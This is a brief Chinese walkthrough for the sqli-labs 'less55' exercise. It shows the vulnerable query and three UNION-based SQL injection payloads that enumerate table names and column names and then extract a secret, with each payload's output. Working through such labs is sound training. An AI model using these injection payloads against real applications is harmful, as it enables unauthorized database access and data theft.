---
title: less55
url: https://www.yuque.com/u29002979/ep2zrx/tka2r9ivly3e3slv
---

```bash
$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";
```

闭合方式为小括号),一共十四次机会\ <a name="qqbdN"></a>

# 爆破数据表

`?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+`&#x20;
数据表：3cr26yzl9f <a name="bNqYh"></a>

# 爆破数据字段

`?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name='3cr26yzl9f'--+`&#x20;
字段：secret\_TATB <a name="VdFKq"></a>

# 获取密码

`?id=-1) union select 1,2,(select secret_TATB from 3cr26yzl9f)--+`
密码：zXYZR5qfxz3Q2LUi8v1ip6dx
